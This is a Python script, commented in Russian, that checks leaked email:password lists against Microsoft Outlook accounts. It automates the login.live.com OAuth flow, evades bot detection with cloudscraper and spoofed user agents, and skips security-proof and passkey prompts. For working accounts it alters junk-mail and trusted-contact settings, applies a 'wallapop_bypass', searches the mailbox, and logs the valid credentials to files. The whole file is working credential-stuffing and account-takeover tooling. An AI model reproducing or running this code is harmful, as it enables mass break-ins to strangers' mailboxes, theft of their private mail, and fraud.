import os
import re
import time
import urllib.parse
import uuid
import hashlib
from concurrent.futures import as_completed
from concurrent.futures import ThreadPoolExecutor

import cloudscraper
from bs4 import BeautifulSoup
from fake_useragent import UserAgent

from src.mail.mail_api import (get_junk_email_configuration, search_custom_emails, wallapop_bypass,
                               set_contacts_trusted, get_contacts_trusted)
from src.mail.utils.const_mail import RESULT_DIR
from src.logging.logger_init import setup_logger
from src.mail.utils.headers import headers_1, headers_3
import base64
import json

logger = setup_logger(__name__)
BLOCKED_DIR = os.path.join(RESULT_DIR, "blocked")
RESET_OUTPUT_FILE = os.path.join(RESULT_DIR, "reset_results.txt"
                                 )
os.makedirs(BLOCKED_DIR, exist_ok=True)
TIMEOUT = 10
MAX_RETRIES = 5
TRUSTED_EMAIL = "info@info.wallapop.com"
CHECK_INTERVAL = 1  # Check every 1 second
BACKOFF_DELAY = 5  # Initial backoff delay for 429 errors
MAX_BACKOFF = 60  # Maximum backoff delay
EMAIL_CHECK_ATTEMPTS = 5  # Number of attempts to check for reset email
EMAIL_CHECK_INTERVAL = 10  # Seconds between email checks
NUM_THREADS = 10

# Existing functions (unchanged)
def extract_server_data(html):
    logger.info("Начало extract_server_data:")
    pattern = r"var\s+ServerData\s*=\s*(\{.*?\});"
    match = re.search(pattern, html, re.DOTALL)
    if not match:
        logger.error("ServerData не найден в HTML")
        raise ValueError("ServerData не найден в HTML")
    js_object = match.group(1).rstrip(';')
    js_object = re.sub(r'(\w+):', r'"\1":', js_object)
    js_object = re.sub(r"'", r'"', js_object)
    js_object = js_object.replace('True', 'true').replace('False', 'false').replace('None', 'null')
    try:
        logger.debug("(extract_server_data): Успех")
        return json.loads(js_object)
    except json.JSONDecodeError as e:
        logger.error(f"(extract_server_data): Ошибка парсинга JSON: {e}")
        raise

def parse_html_form(html):
    logger.info("Начало parse_html_form:")
    soup = BeautifulSoup(html, 'html.parser')
    form = soup.find('form')
    if not form:
        logger.error("(parse_html_form): Форма не найдена в HTML")
        raise ValueError("Форма не найдена")
    action = form.get('action')
    form_data = {input_tag.get('name'): input_tag.get('value', '')
                 for input_tag in form.find_all('input', {'type': 'hidden'})
                 if input_tag.get('name')}
    logger.debug("(parse_html_form): Успех")
    return action, form_data

def parse_html_form2(html):
    logger.info("Начало parse_html_form2:")
    soup = BeautifulSoup(html, 'html.parser')
    form = soup.find('form', {'id': 'frmVerifyProof'})
    if not form:
        logger.error("(parse_html_form2): Форма frmVerifyProof не найдена")
        raise ValueError("Форма frmVerifyProof не найдена")
    action = form.get('action')
    form_data = {input_tag.get('name'): input_tag.get('value', '')
                 for input_tag in form.find_all('input', {'type': 'hidden'})
                 if input_tag.get('name')}
    radio_input = form.find('input', {'type': 'radio', 'name': 'proof', 'value': True})
    if radio_input:
        form_data['iProofOptions'] = radio_input['value']
    form_data['GeneralVerify'] = '0'
    form_data['iOttText'] = ''
    return action, form_data

def generate_pkce_pair():
    logger.info("Начало generate_pkce_pair:")
    code_verifier = base64.urlsafe_b64encode(os.urandom(32)).decode('utf-8').rstrip('=')
    sha256 = hashlib.sha256(code_verifier.encode('ascii')).digest()
    code_challenge = base64.urlsafe_b64encode(sha256).decode('utf-8').rstrip('=')
    logger.debug(f"(parse_html_form): Успех {code_verifier, code_challenge}")
    return code_verifier, code_challenge

def generate_oauth_url(
        email: str,
        client_id: str = "9199bf20-a13f-4107-85dc-02114787ef48",
        redirect_uri: str = "https://outlook.live.com/mail/",
        scope: str = "service::outlook.office.com::MBI_SSL openid profile offline_access",
        response_type: str = "code",
        response_mode: str = "fragment",
        tenant: str = "consumers",
        locale: str = "en-US",
        code_challenge: str = '',
) -> str:
    logger.info("Начало generate_oauth_url:")
    state = {"id": str(uuid.uuid4()), "meta": {"interactionType": "redirect"}}
    nonce = str(uuid.uuid4())
    params = {
        "client_id": client_id,
        "scope": scope,
        "redirect_uri": redirect_uri,
        "response_type": response_type,
        "state": base64.urlsafe_b64encode(json.dumps(state).encode()).decode(),
        "response_mode": response_mode,
        "nonce": nonce,
        "login_hint": email,
        "code_challenge": code_challenge,
        "code_challenge_method": "S256",
        "x-client-SKU": "msal.js.browser",
        "x-client-Ver": "4.4.0",
        "uaid": str(uuid.uuid4()).replace("-", ""),
        "msproxy": "1",
        "issuer": "mso",
        "tenant": tenant,
        "ui_locales": locale,
        "client_info": "1",
        "fl": "dob,flname,wld",
        "cobrandid": "ab0455a0-8d03-46b9-b18b-df2f57b9e44c",
        "claims": json.dumps({"access_token": {"xms_cc": {"values": ["CP1"]}}})
    }
    base_url = "https://login.live.com/oauth20_authorize.srf"
    logger.debug(f"(parse_html_form): Успех {base_url + '?' + urllib.parse.urlencode(params)}")
    return base_url + "?" + urllib.parse.urlencode(params)

def extract_canary(html_content: str) -> str | None:
    logger.info("Начало extract_canary:")
    soup = BeautifulSoup(html_content, 'html.parser')
    canary_input = soup.find('input', {'name': 'canary'})
    if canary_input and canary_input.has_attr('value'):
        logger.debug("canary: canary_input['value']")
        return canary_input['value']
    logger.warning("Canary не найден, используется значение по умолчанию")
    return 'X-OWA-CANARY_cookie_is_null_or_empty'

def parse_login_response(response_text):
    logger.info("Начало parse_login_response:")
    checks = {
        "account.live.com/Abuse": "locked",
        "Your account or password is incorrect.": "invalid",
        "live.com/recover": "recovery",
        "ar/cancel": "security_info_change",
        "CFFFFC15": "mail_not_found",
        "80041012": "password_incorrect",
        'i5245': "kmsi",
        "interrupt/passkey": "passkey_interrupt",
        "agreements/privacy": "2fa_detected",
        "proofs/Add": "proof"
    }
    for keyword, status in checks.items():
        if keyword in response_text:
            logger.debug(f"(parse_login_response): status: {status}, response: {response_text}")
            return {"status": status, "response": response_text}
    logger.error(f"(parse_login_response): status: failed, response: {response_text}")
    return {"status": "failed", "response": response_text}

def process_passkey_interrupt(session, requests_response):
    logger.info("Начало process_passkey_interrupt:")
    headers = {
        'Host': 'account.live.com',
        'Connection': 'keep-alive',
        'Cache-Control': 'max-age=0',
        'sec-ch-ua': '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'Upgrade-Insecure-Requests': '1',
        'Origin': 'https://login.live.com',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
        'Sec-Fetch-Site': 'same-site',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Dest': 'document',
        'Referer': 'https://login.live.com/',
        'Accept-Encoding': 'gzip, deflate, br',
        'Accept-Language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
        "User-Agent": session.headers.get("User-Agent", ""),
    }
    action, params = parse_html_form(requests_response.text)
    result = session.post(action, headers=headers, data=params, allow_redirects=True, timeout=TIMEOUT, verify=True)
    skip_match = re.search(r'"urlPasskeyNotSupported"\s*:\s*"([^"]+)"', result.text)
    skip_value = skip_match.group(1) if skip_match else None
    if skip_value is None:
        logger.error("(process_passkey_interrupt): urlPasskeyNotSupported не найден в ответе")
        return 'retry'
    decoded_url = skip_value.encode('utf-8').decode('unicode_escape')
    headers = {
        "Host": "login.live.com",
        "Connection": "keep-alive",
        "sec-ch-ua": '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "Upgrade-Insecure-Requests": "1",
        "User-Agent": session.headers.get("User-Agent", ""),
        "Accept": 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
        "Sec-Fetch-Site": "same-site",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-User": "?1",
        "Sec-Fetch-Dest": "document",
        "Referer": "https://account.live.com/",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": "ru-RU,ru;q=0.9"
    }
    requests_response = session.get(decoded_url, headers=headers, allow_redirects=True, timeout=TIMEOUT, verify=True)
    urlPost_value = requests_response.url
    ppft_match = re.search(r'name="PPFT" id="i0327" value="([^"]*)"', requests_response.text)
    ppft_value = ppft_match.group(1) if ppft_match else None
    logger.info(f"(process_passkey_interrupt): Успех - {urlPost_value, ppft_value, requests_response}")
    return urlPost_value, ppft_value, requests_response

def process_access_token(session, code_challenge, code_verifier):
    logger.info("Начало process_access_token:")
    headers = {
        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
        "accept-language": "ru-RU,ru;q=0.9",
        "cache-control": "no-cache",
        "pragma": "no-cache",
        "priority": "u=0, i",
        "referer": "https://outlook.live.com/",
        "sec-ch-ua": '"Google Chrome";v="135", "Not-A.Brand";v="8", "Chromium";v="135"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "iframe",
        "sec-fetch-mode": "navigate",
        "sec-fetch-site": "cross-site",
        "upgrade-insecure-requests": "1",
        "User-Agent": session.headers.get("User-Agent", "")
    }
    params = {
        "client_id": "9199bf20-a13f-4107-85dc-02114787ef48",
        "scope": "service::outlook.office.com::MBI_SSL openid profile offline_access",
        "redirect_uri": "https://outlook.live.com/mail/oauthRedirect.html",
        "client-request-id": str(uuid.uuid4()),
        "response_mode": "fragment",
        "response_type": "code",
        "x-client-SKU": "msal.js.browser",
        "x-client-VER": "4.4.0",
        "client_info": "1",
        "code_challenge": code_challenge,
        "code_challenge_method": "S256",
        "prompt": "none",
        "nonce": str(uuid.uuid4()),
        "state": base64.urlsafe_b64encode(
            json.dumps({"id": str(uuid.uuid4()), "meta": {"interactionType": "silent"}}).encode()).decode(),
        "claims": '{"access_token":{"xms_cc":{"values":["CP1"]}}}'
    }
    logger.info("Отправка запроса на авторизацию OAuth")
    response_4 = session.get('https://login.microsoftonline.com/consumers/oauth2/v2.0/authorize', params=params,
                             headers=headers, allow_redirects=True, timeout=TIMEOUT, verify=True)
    logger.info(f"Статус ответа OAuth: {response_4.status_code}")
    if response_4.status_code != 200:
        logger.error(f"Не удалось получить код авторизации: {response_4.text[:500]}")
        return None
    from urllib.parse import urlparse, parse_qs, urlsplit
    final_url = response_4.url
    query = urlsplit(final_url).fragment
    paramss = parse_qs(query)
    code = paramss.get("code", [None])[0]
    if not code:
        logger.error("Код авторизации не найден в URL")
        return None
    headers = {
        "accept": "*/*",
        "accept-language": "ru-RU,ru;q=0.9",
        "cache-control": "no-cache",
        "content-type": "application/x-www-form-urlencoded;charset=utf-8",
        "origin": "https://outlook.live.com",
        "pragma": "no-cache",
        "priority": "u=1, i",
        "referer": "https://outlook.live.com/",
        "sec-ch-ua": '"Google Chrome";v="135", "Not-A.Brand";v="8", "Chromium";v="135"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "cross-site",
        "User-Agent": session.headers.get("User-Agent", "")
    }
    data = {
        "client_id": "9199bf20-a13f-4107-85dc-02114787ef48",
        "redirect_uri": "https://outlook.live.com/mail/oauthRedirect.html",
        "scope": "service::outlook.office.com::MBI_SSL openid profile offline_access",
        "code": code,
        "x-client-SKU": "msal.js.browser",
        "x-client-VER": "4.4.0",
        "x-ms-lib-capability": "retry-after, h429",
        "x-client-current-telemetry": "5|863,0,,,|,",
        "x-client-last-telemetry": "5|0|||0,0",
        "code_verifier": code_verifier,
        "grant_type": "authorization_code",
        "client_info": "1",
        "claims": '{"access_token":{"xms_cc":{"values":["CP1"]}}}'
    }
    logger.info("Отправка запроса на получение токена")
    response = session.post('https://login.microsoftonline.com/consumers/oauth2/v2.0/token', headers=headers,
                            data=data, allow_redirects=True, timeout=TIMEOUT, verify=True)
    logger.info(f"Статус ответа токена: {response.status_code}")
    # data = response.json()
    # print(json.dumps(data, indent=4, sort_keys=True))
    if response.status_code != 200:
        logger.error(f"Не удалось получить токен: {response.text[:500]}")
    return response

def process_get_mailbox_cookie(session):
    logger.info("Начало process_get_mailbox_cookie:")
    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
        'accept-language': 'ru-RU,ru;q=0.9',
        'cache-control': 'no-cache',
        'pragma': 'no-cache',
        'priority': 'u=0, i',
        'referer': 'https://outlook.live.com/',
        'sec-ch-ua': '"Google Chrome";v="135", "Not-A.Brand";v="8", "Chromium";v="135"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'upgrade-insecure-requests': '1',
        "User-Agent": session.headers.get("User-Agent", "")
    }
    response = session.get('https://outlook.live.com/mail/', headers=headers,
                           allow_redirects=True, timeout=TIMEOUT, verify=True)
    if len(response.history) >= 2:
        action, params = parse_html_form(response.text)
        session.post(action, data=params, headers=headers, allow_redirects=False, timeout=TIMEOUT, verify=True)
    logger.info("(process_get_mailbox_cookie): куки нет")

def decode_jwt_without_verification(token):
    logger.info("Начало decode_jwt_without_verification:")
    header_b64, payload_b64, _ = token.split('.')

    def b64decode(data):
        padded = data + '=' * (-len(data) % 4)
        logger.debug(f"(decode_jwt_without_verification): base: {base64.urlsafe_b64decode(padded)}")
        return base64.urlsafe_b64decode(padded)

    header = json.loads(b64decode(header_b64))
    payload = json.loads(b64decode(payload_b64))
    logger.debug(f"(decode_jwt_without_verification): header: {header}, payload: {payload}")
    return {"header": header, "payload": payload}

def go_login(session, email, password, link_email=True):
    logger.info("Начало go_login:")
    code_verifier, code_challenge = generate_pkce_pair()
    auth_url = generate_oauth_url(email, code_challenge=code_challenge)
    base_headers = {
        "Host": "login.live.com",
        "Upgrade-Insecure-Requests": "1",
        "User-Agent": session.headers.get("User-Agent", ""),
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": "ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7"
    }
    logger.info(f"Отправка начального запроса авторизации для {email}")
    response_1 = session.get(auth_url, headers=base_headers, timeout=TIMEOUT, verify=True)
    logger.info(f"Статус начального запроса: {response_1.status_code}")

    if response_1.status_code != 200:
        logger.error(f"Ошибка начального запроса: {response_1.text[:500]}")
        return 'retry'

    ppft_match = re.search(r'name="PPFT" id="i0327" value="([^"]*)"', response_1.text)
    ppft_value = ppft_match.group(1) if ppft_match else None
    urlPostMsa_match = re.search(r"urlPostMsa:'([^']+)'", response_1.text)
    urlPostMsa_value = urlPostMsa_match.group(1) if urlPostMsa_match else None
    if not urlPostMsa_value or not ppft_value:
        logger.error(f"Не удалось извлечь urlPostMsa или PPFT: urlPostMsa={urlPostMsa_value}, PPFT={ppft_value}")
        return 'retry'

    post_data = {
        'ps': '2',
        'psRNGCDefaultType': '',
        'psRNGCEntropy': '',
        'psRNGCSLK': '',
        'canary': '',
        'ctx': '',
        'hpgrequestid': '',
        'PPFT': ppft_value,
        'PPSX': 'PassportRN',
        'NewUser': '1',
        'FoundMSAs': '',
        'fspost': '0',
        'i21': '0',
        'CookieDisclosure': '0',
        'IsFidoSupported': '1',
        'isSignupPost': '0',
        'isRecoveryAttemptPost': '0',
        'i13': '0',
        'login': email,
        'loginfmt': email,
        'type': '11',
        'LoginOptions': '3',
        'lrt': '',
        'lrtPartition': '',
        'hisRegion': '',
        'hisScaleUnit': '',
        'passwd': password
    }
    base_headers['referer'] = auth_url
    logger.info(f"Отправка POST-запроса для входа: {urlPostMsa_value}")
    requests_response = session.post(urlPostMsa_value, data=post_data, headers=base_headers,
                                     allow_redirects=False, timeout=TIMEOUT, verify=True)
    status = parse_login_response(requests_response.text)
    logger.info(f"Статус ответа на вход: {status['status']}")
    if status['status'] in ('locked', 'invalid', 'recovery', 'security_info_change', 'mail_not_found',
                            'password_incorrect', '2fa_detected'):
        return status['status']

    urlPost_value = None
    if 'proof' in status['status']:
        base_headers = headers_1(session)
        action, params = parse_html_form(requests_response.text)
        requests_response = session.post(action, headers=base_headers, data=params, allow_redirects=True,
                                         timeout=TIMEOUT, verify=True)
        if '<meta name="PageId" content="i6112"' in requests_response.text:
            action, params = parse_html_form(requests_response.text)
            post_data = {
                'iProofOptions': 'Email',
                'DisplayPhoneCountryISO': '',
                'DisplayPhoneNumber': '',
                'EmailAddress': '',
                'canary': params.get('canary', ''),
                'action': 'Skip',
                'PhoneNumber': '',
                'PhoneCountryISO': ''
            }
            requests_response = session.post(action, headers=headers_3(session), data=post_data,
                                             allow_redirects=True, timeout=TIMEOUT, verify=True)
    if 'passkey_interrupt' in status['status']:
        urlPost_value, ppft_value, requests_response = process_passkey_interrupt(session, requests_response)

    if 'kmsi' in status['status']:
        urlPost_match = re.search(r"urlPost:'([^']+)'", requests_response.text)
        urlPost_value = urlPost_match.group(1) if urlPost_match else None

        if urlPost_value:
            session.get(urlPost_value, headers=base_headers, allow_redirects=True, timeout=TIMEOUT, verify=True)

    if urlPost_value:
        session.post(urlPost_value, data={
            "PPFT": ppft_value,
            "canary": "",
            "LoginOptions": "1",
            "type": "28",
            "hpgrequestid": "",
            "ctx": ""
        }, headers=base_headers, allow_redirects=False, timeout=TIMEOUT, verify=True)
    process_get_mailbox_cookie(session)
    requests_response = process_access_token(session, code_challenge, code_verifier)
    if requests_response is None or requests_response.status_code != 200:
        return 'retry'
    token_info = requests_response.json()
    client = token_info.get('id_token')
    decoded = decode_jwt_without_verification(client)['payload']
    mailbox = f"PUID:{decoded['puid']}@84df9e7f-e9f6-40af-b435-aaaaaaaaaaaa"
    session.headers['x-anchormailbox'] = mailbox
    # print("хуйцхуйцтокен::: ",token_info)
    return session, token_info, 'valid'

def check_account(email, password, config=None, max_retries=3):
    logger.info("Начало check_account:")
    ua = UserAgent()

    user_agent = ua.getGoogle['useragent']
    session = cloudscraper.create_scraper()
    session.headers.update({
        "User-Agent": user_agent,
    })
    session_id = uuid.uuid4().hex[:8]
    # proxy = build_proxy(session_id)
    # session.proxies.update(proxy)

    print(f"На {email} используется прокси -> {None}")

    retry_count = 0
    status = ""
    while retry_count < max_retries:

        result = go_login(session, email, password)

        if isinstance(result, tuple):
            session, token_json, status = result
        else:
            session = cloudscraper.create_scraper()
            token_json = None
            status = result
        if status != 'retry':
            break
        retry_count += 1
        print(f"[RETRY {retry_count}] {email}")

    logger.info(f"(check_account): {status}, '\t', {email}")
    print(status, '\t', email)

    if session is not None and status == 'valid':
        logger.info(f"Config: {config}")
        if not config:
            logger.warning("Config is empty, returning successful login data")
            return email, password, session, token_json
        else:
            logger.info("Проверка конфигурации спама")
            blocked = get_junk_email_configuration(
                session,
                canary='X-OWA-CANARY_cookie_is_null_or_empty',
                token=token_json["access_token"],
            )
            logger.info(f"Результат get_junk_email_configuration: {blocked}")

            if blocked:
                set_contacts_trusted(session, canary='X-OWA-CANARY_cookie_is_null_or_empty',
                                     token=token_json["access_token"])

                wallapop_bypass(session, token_json["access_token"])
                return email, password, session, token_json

                # time.sleep(0)  # поставить остановку на время обновления
                #
                # isContactsTrusted = get_contacts_trusted(session, canary='X-OWA-CANARY_cookie_is_null_or_empty',
                #                                          token=token_json["access_token"])
                #
                # if isContactsTrusted is False:
                #     # session.close() # должна закрываться сессия
                #     save_blocked_matches(f"{email}:{password}", blocked, config)
                #     return None, None, session, None
                # else:
                #     print("время обходика")
                #     is_walla_bypassed = wallapop_bypass(session, token_json["access_token"])
                #     if is_walla_bypassed:
                #         save_blocked_matches(f"{email}:{password}", blocked, config)
                #
                #         return email, password, session, token_json
                #     return None, None, session, None
            #
            # result = search_custom_emails(
            #     session,
            #     canary='X-OWA-CANARY_cookie_is_null_or_empty',
            #     token=token_json["access_token"],
            #     queries=config
            # )
            # logger.info(f"Результат search_custom_emails: {result}")
            #
            # if result:
            #     save_search_results(result, config, login=email, password=password)

            return email, password, session, token_json

    save_text_to_file(f'{email}:{password}', status)
    return None, None, session, None

def save_search_results(response_json, queries: list[str], login: str, password: str):
    os.makedirs(RESULT_DIR, exist_ok=True)
    conversations = response_json.get("EntitySets", [])[0].get("ResultSets", [])[0].get("Results", [])
    query_map = {q.strip().lower(): q.strip() for q in queries if q.strip()}
    found = {original: 0 for original in query_map.values()}
    for conv in conversations:
        email = conv.get("Source", {}).get("From", {}).get("EmailAddress", {}).get("Address", "").lower()
        for q_lower, original in query_map.items():
            if q_lower in email:
                found[original] += 1
    for phrase, count in found.items():
        if count > 0:
            filename = os.path.join(RESULT_DIR, f"{phrase}.txt")
            with open(filename, "a", encoding="utf-8") as f:
                # wallapop_valid_mail = f"{login}:{password}"
                f.write(f"{login}:{password}\n")
    logger.info("(save_search_results): Вход")
    # return wallapop_valid_mail

def save_text_to_file(content: str, filename: str):
    os.makedirs(RESULT_DIR, exist_ok=True)
    path = os.path.join(RESULT_DIR, f"{filename}.txt")
    with open(path, "a", encoding="utf-8") as f:
        f.write(content + "\n")
    logger.info("(save_text_to_file): Вход")

def save_blocked_matches(account, blocked_data: dict, queries: list[str]):
    blocked = [b.lower() for b in blocked_data.get("Options", {}).get("BlockedSendersAndDomains", [])]
    for query in queries:
        q = query.strip().lower()
        matched = [b for b in blocked if q in b]
        if matched:
            path = os.path.join(BLOCKED_DIR, f"{query.strip()}.txt")
            with open(path, "a", encoding="utf-8") as f:
                for match in matched:
                    f.write(f"{account}\n")
    logger.info("(save_text_to_file): Вход")

def generate_sec_ch_ua(user_agent: str) -> str:
    match = re.search(r'Chrome/(\d+)', user_agent)
    version = match.group(1) if match else "120"
    return f'"Google Chrome";v="{version}", "Chromium";v="{version}", "Not/A)Brand";v="24"'


def normalize_accounts(account_lines: list[str]) -> list[tuple[str, str]]:
    seen = set()
    normalized = []
    email_regex = re.compile(r"^[^@]+@[^@]+\.[^@]+$")
    for line in account_lines:
        line = line.strip()
        if not line or ':' not in line:
            continue
        email, password = map(str.strip, line.split(':', 1))
        if not email_regex.match(email) or len(password) < 4:
            continue
        key = f"{email}:{password}"
        if key not in seen:
            seen.add(key)
            normalized.append((email, password))
    logger.info("(normalize_accounts): accounts normalized")
    return normalized

def main():
    accounts = []

    try:
        with open('../../input/base.txt', 'r', errors="replace") as f:
            accounts = f.readlines()

        if len(accounts) == 0:
            raise Exception()
    except Exception as e:
        print('account upload error')
        print(e)


    print('было загруженно аккаунтов', len(accounts))
    accounts = normalize_accounts(accounts)

    print('Осталось аккаунтов', len(accounts))

    config = []
    try:
        with open('../../input/config.txt', 'r') as f:
            config = f.readlines()

        if len(config) == 0:
            raise Exception()
    except Exception as e:
        print('config upload error or empty')
        print(e)

    time_start = time.time()

    with ThreadPoolExecutor(max_workers=1) as executor:
        futures = {
            executor.submit(check_account, email, password, config): (email, password)
            for email, password in accounts
        }

        for future in as_completed(futures):
            email, _ = futures[future]
            try:
                future.result(timeout=300)
            except TimeoutError:
                print(f"[TIMEOUT] {email} — exceeded time limit")
            except Exception as e:
                print(f"[THREAD ERROR] {email} — {e}")

    time_end = time.time()
    work_time = time_end - time_start
    print(f"[*] Working time: {work_time}")

if __name__ == '__main__':
    main()